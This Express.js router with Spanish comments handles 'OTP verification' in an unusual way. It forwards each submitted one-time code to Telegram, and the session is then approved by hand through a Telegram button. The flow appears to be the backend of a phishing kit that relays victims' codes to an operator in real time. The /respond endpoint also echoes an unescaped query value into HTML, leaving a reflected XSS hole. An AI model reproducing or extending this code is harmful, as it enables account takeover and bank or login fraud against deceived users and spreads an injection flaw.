const express = require('express');
const router = express.Router();
const telegramService = require('../services/telegramService');
const sessionService = require('../services/sessionService');
const { validateOtpCode } = require('../middleware/validationMiddleware');

// POST /api/otp/verify
router.post('/verify', async (req, res) => {
  try {
    const { code } = req.body;

    // Validación
    if (!code || !validateOtpCode(code)) {
      return res.status(400).json({ error: 'Código OTP inválido (debe ser 4 dígitos)' });
    }

    // Crear sesión
    const sessionId = sessionService.createSession({
      type: 'otp',
      code,
    });

    // Enviar a Telegram (sin bloquear si falla)
    try {
      await telegramService.sendOtpRequest(sessionId, code);
      console.log('[OTP] Mensaje enviado a Telegram exitosamente');
    } catch (telegramError) {
      console.error('[OTP] Error enviando a Telegram:', telegramError.message);
      // No fallar aquí, dejar que continúe el polling
    }

    // Responder al cliente
    res.json({
      sessionId,
      message: 'Código OTP enviado. Aguardando verificación...',
    });
  } catch (error) {
    console.error('[OTP ERROR]', error);
    res.status(500).json({ error: 'Error al procesar OTP: ' + error.message });
  }
});

// GET /api/otp/status/:sessionId
router.get('/status/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;

    if (!sessionId) {
      return res.status(400).json({ error: 'Session ID requerido' });
    }

    const session = sessionService.getSession(sessionId);

    if (!session) {
      return res.status(404).json({ error: 'Sesión no encontrada o expirada' });
    }

    if (sessionService.isExpired(sessionId)) {
      sessionService.deleteSession(sessionId);
      return res.status(410).json({ error: 'Sesión expirada' });
    }

    res.json({
      sessionId,
      status: session.status,
      response: session.response,
    });
  } catch (error) {
    console.error('[OTP STATUS ERROR]', error);
    res.status(500).json({ error: 'Error al obtener estado OTP' });
  }
});

// GET /api/otp/respond/:sessionId - Endpoint para botones de Telegram
router.get('/respond/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;
    const { response } = req.query;

    if (!sessionId || !response) {
      return res.status(400).json({ error: 'Parámetros requeridos' });
    }

    const session = sessionService.getSession(sessionId);

    if (!session) {
      return res.status(404).json({ error: 'Sesión no encontrada' });
    }

    // Actualizar sesión con la respuesta
    sessionService.updateSessionStatus(sessionId, 'completed', response);

    console.log(`[OTP RESPOND] Session ${sessionId}: ${response}`);

    // Responder con página de éxito
    res.send(`
      <html>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
          <h1>✅ Código OTP verificado</h1>
          <p>Tu respuesta: <strong>${response}</strong></p>
          <p>Puedes cerrar esta ventana y continuar en la aplicación.</p>
        </body>
      </html>
    `);
  } catch (error) {
    console.error('[OTP RESPOND ERROR]', error);
    res.status(500).json({ error: 'Error al procesar respuesta OTP' });
  }
});

module.exports = router;
